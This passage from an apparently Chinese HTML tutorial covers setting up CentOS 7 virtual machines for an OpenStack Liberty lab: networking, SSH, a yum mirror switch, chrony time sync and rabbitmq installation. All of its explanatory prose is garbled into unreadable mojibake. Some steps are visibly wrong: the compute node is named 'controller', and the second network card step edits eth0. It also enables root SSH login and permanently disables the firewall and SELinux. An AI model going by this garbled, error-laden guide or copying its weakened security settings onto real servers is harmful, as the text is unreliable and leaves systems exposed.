class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">net.ifnames=0 biosdevname=0<br></code></pre></td></tr></table></figure><p>ä¹‹åè¿›å…¥å›¾å½¢åŒ–å®‰è£…ç•Œé¢ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108203222232.png" alt="image-20250108203222232"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108203329247.png" alt="image-20250108203329247"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108203415595.png" alt="image-20250108203415595"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108203459938.png" alt="image-20250108203459938"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205645888.png" alt="image-20250108205645888"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205739323.png" alt="image-20250108205739323"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205818666.png" alt="image-20250108205818666"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205937549.png" alt="image-20250108205937549"></p><p>å¦‚æœè¾“å…¥çš„å¯†ç æ¯”è¾ƒçŸ­çš„è¯ï¼Œè¿™é‡Œè¦ç‚¹å‡»ä¸¤æ¬¡å®Œæˆï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108205954270.png" alt="image-20250108205954270"></p><p>ç­‰å¾…ä¸‹é¢è¿™ä¸ªè¿›åº¦æ¡ç»“æŸä¹‹åç‚¹å‡»é‡å¯</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108210416469.png" alt="image-20250108210416469"></p><p>é‡å¯ä¹‹åä½¿ç”¨rootç™»å½•</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250108212021905.png" alt="image-20250108212021905"></p><h3 id="ä¿®æ”¹ä¸»æœºå">ä¿®æ”¹ä¸»æœºå</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">hostnamectl set-hostname controller<br>bash<br>hostname<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109180325082.png" alt="image-20250109180325082"></p><h3 id="ä¿®æ”¹ç¬¬ä¸€å—ç½‘å¡">ä¿®æ”¹ç¬¬ä¸€å—ç½‘å¡</h3><p>é¦–å…ˆæ‰“å¼€è™šæ‹Ÿæœºçš„è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ï¼Œè®°ä½å­ç½‘æ©ç å’Œç½‘å…³ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110112850428.png" alt="image-20250110112850428">å†æŸ¥çœ‹ä¸€ä¸‹IPèŒƒå›´</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110112940219.png" alt="image-20250110112940219"></p><p>ä¿®æ”¹ä¸»æœºipåœ°å€</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/sysconfig/network-scripts/ifcfg-eth0<br></code></pre></td></tr></table></figure><p>åœ¨IPåœ°å€å’Œå­ç½‘æ©ç éƒ¨åˆ†ï¼Œå­ç½‘æ©ç å°±æ˜¯è™šæ‹Ÿæœºnetæ¨¡å¼çš„å­ç½‘æ©ç ï¼ŒIPåœ°å€å°±æ˜¯åœ¨IPèŒƒå›´å†…çš„éšæ„æ•°å³å¯ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110144143023.png" alt="image-20250110144143023"></p><p>ä¿å­˜é€€å‡ºåï¼Œé‡å¯ç½‘å¡ï¼Œä½¿ç½‘å¡ç”Ÿæ•ˆã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl restart network<br></code></pre></td></tr></table></figure><p>å‘ç°æŠ¥é”™ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æŠ¥é”™ä¿¡æ¯</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109175108548.png" alt="image-20250109175108548"></p><p>è¿™ä¸ªæŠ¥é”™çš„åŸå› æ˜¯é…ç½®æ–‡ä»¶ä¸­MACä¸å½“å‰ç½‘å¡MACä¸ä¸€è‡´ï¼Œåªéœ€è¦ä¿®æ”¹ä¸€ä¸‹é…ç½®æ–‡ä»¶å³å¯ã€‚</p><p>é€šè¿‡<code>ip a</code>å‘½ä»¤æŸ¥çœ‹macåœ°å€æ˜¯00:0c:29:bc:d2:97</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109175452426.png" alt="image-20250109175452426"></p><p>ç„¶ååœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥è¿™ä¸€è¡Œï¼ˆå¦‚æœå­˜åœ¨çš„è¯åªä¿®æ”¹å°±å¯ä»¥ï¼‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">HWADDR=00:0c:29:bc:d2:97<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™å†é‡å¯å°±æ²¡é—®é¢˜äº†</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109175800342.png" alt="image-20250109175800342"></p><h3 id="ä¿®æ”¹ç¬¬äºŒå—ç½‘å¡">ä¿®æ”¹ç¬¬äºŒå—ç½‘å¡</h3><p>åŒæ ·ï¼ŒæŸ¥çœ‹ä¸»æœºæ¨¡å¼çš„IPæ©ç å’ŒIPèŒƒå›´ï¼Œä¸»æœºæ¨¡å¼å¯ä»¥ä¸ç”¨è®¾ç½®ç½‘å…³ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109200754419.png" alt="image-20250109200754419"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110152831681.png" alt="image-20250110152831681"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/sysconfig/network-scripts/ifcfg-eth0<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„IPåœ°å€è¦è·Ÿä¸»æœºæ¨¡å¼åœ¨åŒä¸€ä¸ªç½‘æ®µã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109200710910.png" alt="image-20250109200710910"></p><p>åˆ«å¿˜è®°è®¾ç½®ç½‘å¡MACåœ°å€<code>HWADDR=00:0c:29:bc:d2:a1</code>ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109193103326.png" alt="image-20250109193103326"></p><p>é‡å¯ç½‘ç»œæœåŠ¡ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl restart network<br></code></pre></td></tr></table></figure><h3 id="åˆ›å»ºsshè¿æ¥">åˆ›å»ºsshè¿æ¥</h3><p>å¼€å¯sshdæœåŠ¡å¹¶æ›´æ”¹é»˜è®¤é…ç½®æ–‡ä»¶ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> sshd<br>vi /etc/ssh/sshd_config<br></code></pre></td></tr></table></figure><p>å¯èƒ½éœ€è¦æ›´æ”¹çš„åœ°æ–¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs config">Port=22  è®¾ç½®SSHçš„ç«¯å£å·æ˜¯22(é»˜è®¤ç«¯å£å·ä¸º22)<br>PermitRootLogin  yes  è®¾ç½®ä¸ºyesæ˜¯å…è®¸rootç”¨æˆ·ç™»é™†<br>ClientAliveInterval 60 æœåŠ¡å™¨å‘é€ä¿æŒæ´»åŠ¨æ¶ˆæ¯çš„æ—¶é—´é—´éš”ï¼Œä¸å¸Œæœ›sshæ— æ“ä½œæ–­è¿å¤ªå¿«å°±æ”¹å¤§ä¸€ç‚¹ï¼Œæ¯”å¦‚æ”¹æˆ60<br></code></pre></td></tr></table></figure><p>å¦‚æœæ‰¾ä¸åˆ°è¿™äº›é…ç½®çš„è¯ï¼Œviæœ‰ä¸ªæŸ¥æ‰¾å¿«æ·é”®ï¼Œè¿›å…¥ç®¡ç†æ¨¡å¼ï¼Œä½¿ç”¨<code>/</code>è¿›è¡ŒæŸ¥æ‰¾ï¼Œç„¶åå›è½¦å°±è¡Œã€‚</p><p>é‡å¯sshdæœåŠ¡ï¼Œä½¿é…ç½®ç”Ÿæ•ˆã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">service sshd restart<br></code></pre></td></tr></table></figure><p>å¼€å¯é˜²ç«å¢™ç«¯å£</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">firewall-cmd --zone=public --add-port=22/tcp --permanent  <br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½ä½¿ç”¨è¿æ¥sshäº†ã€‚</p><p>å¦‚æœä½ çš„sshè¿æ¥ä¹ŸæŠ¥<code>WARNING!The remote SSH server rejected X11 forwarding request.</code>è¿™ä¸ªé”™è¯¯ï¼Œé‚£å¯èƒ½æ˜¯å› ä¸ºæ²¡æœ‰ä¸‹è½½xorg-x11-xauth çš„rpmåŒ…ã€‚åœ¨å®Œæˆ1.3yumæ¢æºä¹‹åï¼Œå¯ä»¥ä¸‹è½½è¯¥åŒ…è§£å†³æ­¤é—®é¢˜ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install xorg-x11-xauth<br></code></pre></td></tr></table></figure><h3 id="è®¾ç½®hostsæ–‡ä»¶">è®¾ç½®hostsæ–‡ä»¶</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/hosts<br></code></pre></td></tr></table></figure><p>æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.146.200 compute1<br></code></pre></td></tr></table></figure><h2 id="computeè®¡ç®—èŠ‚ç‚¹">computeè®¡ç®—èŠ‚ç‚¹</h2><p>computeèŠ‚ç‚¹ä¸controllerèŠ‚ç‚¹åŸºç¡€ç¯å¢ƒåŠå®‰è£…ç³»ç»Ÿå¤§è‡´ç›¸åŒï¼Œå¯å‚è€ƒcontrollerèŠ‚ç‚¹é…ç½®ï¼Œä»¥ä¸‹æ˜¯ç¨æœ‰ä¸åŒçš„åœ°æ–¹ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109214859648.png" alt="image-20250109214859648"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109215414205.png" alt="image-20250109215414205"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109215437139.png" alt="image-20250109215437139"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250109215506457.png" alt="image-20250109215506457"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110095136222.png" alt="image-20250110095136222"></p><h3 id="ä¿®æ”¹ä¸»æœºå-2">ä¿®æ”¹ä¸»æœºå</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">hostnamectl set-hostname controller<br>bash<br>hostname<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110101139519.png" alt="image-20250110101139519"></p><h3 id="ä¿®æ”¹ç½‘å¡">ä¿®æ”¹ç½‘å¡</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/sysconfig/network-scripts/ifcfg-eth0<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110143231171.png" alt="image-20250110143231171"></p><p>ç¬¬äºŒå—ç½‘å¡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/sysconfig/network-scripts/ifcfg-eth1<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110143308094.png" alt="image-20250110143308094"></p><p>é‡å¯ç½‘å¡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl restart network<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110103137641.png" alt="image-20250110103137641"></p><h3 id="åˆ›å»ºsshè¿æ¥-2">åˆ›å»ºsshè¿æ¥</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#æ›´æ”¹é»˜è®¤é…ç½®æ–‡ä»¶ã€‚</span><br>vi /etc/ssh/sshd_config<br><span class="hljs-comment">#é‡å¯sshdæœåŠ¡ï¼Œä½¿é…ç½®ç”Ÿæ•ˆã€‚</span><br>service sshd restart<br><span class="hljs-comment">#å¼€å¯é˜²ç«å¢™ç«¯å£</span><br>firewall-cmd --zone=public --add-port=22/tcp --permanent<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½ä½¿ç”¨å·¥å…·è¿æ¥sshäº†ã€‚</p><h3 id="è®¾ç½®hostsæ–‡ä»¶-2">è®¾ç½®hostsæ–‡ä»¶</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/hosts<br></code></pre></td></tr></table></figure><p>æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.146.150 controller<br></code></pre></td></tr></table></figure><h2 id="yumæ¢æº">yumæ¢æº</h2><p>åˆ é™¤ç³»ç»Ÿè‡ªå¸¦yumæ‰€æœ‰æºé…ç½®æ–‡ä»¶</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> -f /etc/yum.repos.d/*<br></code></pre></td></tr></table></figure><p>è·å–é˜¿é‡Œæºçš„é…ç½®æ–‡ä»¶</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># CentOS-Base.repo</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># The mirror system uses the connecting IP address of the client and the</span><br><span class="hljs-comment"># update status of each mirror to pick mirrors that are updated to and</span><br><span class="hljs-comment"># geographically close to the client.  You should use this for CentOS updates</span><br><span class="hljs-comment"># unless you are manually picking other mirrors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># If the mirrorlist= does not work for you, as a fall back you can try the </span><br><span class="hljs-comment"># remarked out baseurl= line instead.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br> <br>[base]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Base - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/os/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/os/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/os/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#released updates </span><br>[updates]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Updates - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/updates/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/updates/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/updates/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#additional packages that may be useful</span><br>[extras]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Extras - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/extras/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/extras/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/extras/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#additional packages that extend functionality of existing packages</span><br>[centosplus]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Plus - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/centosplus/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/centosplus/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/centosplus/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>enabled=0<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#contrib - packages by Centos Users</span><br>[contrib]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Contrib - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/contrib/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/contrib/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/contrib/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>enabled=0<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br></code></pre></td></tr></table></figure><p>æ¸…ç†yumç¼“å­˜ï¼Œå¹¶ç”Ÿæˆæ–°çš„ç¼“å­˜</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum clean all<br>yum makecache<br></code></pre></td></tr></table></figure><p>æ›´æ–°yumæºæ£€æŸ¥æ˜¯å¦ç”Ÿæ•ˆ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y update<br></code></pre></td></tr></table></figure><h2 id="æ—¶é—´åŒæ­¥">æ—¶é—´åŒæ­¥</h2><h3 id="æ§åˆ¶èŠ‚ç‚¹">æ§åˆ¶èŠ‚ç‚¹</h3><p>ä¸‹è½½å®‰è£…chrony</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install chrony<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/chrony.conf</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/chrony.conf<br></code></pre></td></tr></table></figure><p>æ·»åŠ <code>server NTP_SERVER iburst</code>ï¼Œå°†<code>NTP_SERVERNTP_SERVER</code>æ›¿æ¢æˆ<code>time1.aliyun.com</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">server time1.aliyun.com iburst<br><span class="hljs-comment">#ä¿®æ”¹allow</span><br>allow 192.168.146.0/24<br></code></pre></td></tr></table></figure><p>ä¿å­˜å¹¶é€€å‡ºåï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#å¯åŠ¨å¹¶åŠ å…¥å¼€æœºè‡ªå¯</span><br>systemctl <span class="hljs-built_in">enable</span> chronyd.service<br>systemctl start chronyd.service<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250113215300673.png" alt="image-20250113215300673"></p><h3 id="è®¡ç®—èŠ‚ç‚¹">è®¡ç®—èŠ‚ç‚¹</h3><p>ä¸‹è½½å®‰è£…chrony</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install chrony<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/chrony.conf</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/chrony.conf<br></code></pre></td></tr></table></figure><p>ç¼–è¾‘<code>/etc/chrony.conf</code> æ–‡ä»¶å¹¶æ³¨é‡Šé™¤<code>server</code> å€¼å¤–çš„æ‰€æœ‰å†…å®¹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">server controller iburst<br></code></pre></td></tr></table></figure><p>ä¿å­˜å¹¶é€€å‡ºåè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#å¯åŠ¨å¹¶åŠ å…¥å¼€æœºè‡ªå¯</span><br>systemctl <span class="hljs-built_in">enable</span> chronyd.service<br>systemctl start chronyd.service<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110155143151.png" alt="image-20250110155143151"></p><h3 id="éªŒè¯æ“ä½œ">éªŒè¯æ“ä½œ</h3><p>è¾“å…¥å‘½ä»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">chronyc sources<br></code></pre></td></tr></table></figure><p>æ§åˆ¶èŠ‚ç‚¹å°†æ˜¾ç¤º</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250113215341470.png" alt="image-20250113215341470"></p><p>è®¡ç®—èŠ‚ç‚¹å°†æ˜¾ç¤º</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250113215405852.png" alt="image-20250113215405852"></p><h2 id="å®‰è£…é€šç”¨è½¯ä»¶åŒ…">å®‰è£…é€šç”¨è½¯ä»¶åŒ…</h2><p>è®¡ç®—èŠ‚ç‚¹å’Œæ§åˆ¶èŠ‚ç‚¹éƒ½è¦è¿›è¡Œå¦‚ä¸‹æ“ä½œã€‚</p><p>å…ˆç¦ç”¨é˜²ç«å¢™å’Œselinux(æ°¸ä¹…ç¦ç”¨)ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl stop firewalld<br>systemctl <span class="hljs-built_in">disable</span> firewalld<br>setenforce 0<br>getenforce<br>vi /etc/selinux/config<br></code></pre></td></tr></table></figure><p>ç¼–è¾‘é…ç½®æ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110165646713.png" alt="image-20250110165646713"></p><h3 id="OpenStackåŒ…">OpenStackåŒ…</h3><p>åœ¨CentOSä¸­ï¼Œ extrasä»“åº“æä¾›ç”¨äºå¯ç”¨ OpenStack ä»“åº“çš„RPMåŒ…ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># å®‰è£…ç”¨äºå¯ç”¨OpenStackä»“åº“çš„åŒ…ã€‚</span><br>yum install -y https://buildlogs.centos.org/centos/7/cloud/x86_64/openstack-liberty/centos-release-openstack-liberty-1-3.el7.noarch.rpm<br><span class="hljs-comment"># å®‰è£… centos-release-openstack-liberty</span><br>yum install -y centos-release-openstack-liberty<br><span class="hljs-comment">#åœ¨ä¸»æœºä¸Šå‡çº§åŒ…</span><br>yum -y upgrade<br><span class="hljs-comment"># å®‰è£… OpenStack å®¢æˆ·ç«¯</span><br>yum install -y python-openstackclient<br><span class="hljs-comment"># RHELå’Œ CentOS é»˜è®¤å¯ç”¨ SELinux ã€‚å®‰è£… openstack-selinux åŒ…å®ç°å¯¹OpenStackæœåŠ¡çš„å®‰å…¨ç­–ç•¥è¿›è¡Œè‡ªåŠ¨ç®¡ç†</span><br>yum install -y openstack-selinux<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…rabbitmqæ¶ˆæ¯é˜Ÿåˆ—">å®‰è£…rabbitmqæ¶ˆæ¯é˜Ÿåˆ—</h3><p>å®‰è£…åŒ…ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install -y rabbitmq-server<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å¹¶å°†å…¶é…ç½®ä¸ºéšç³»ç»Ÿå¯åŠ¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> rabbitmq-server.service<br>systemctl start rabbitmq-server.service<br></code></pre></td></tr></table></figure><p>éªŒè¯ç«¯å£æ˜¯å¦å­˜åœ¨</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">netstat -lntp|grep 5672<br></code></pre></td></tr></table></figure><p>æ·»åŠ  <code>openstack</code> ç”¨æˆ·ï¼š</p><figure class="highlight 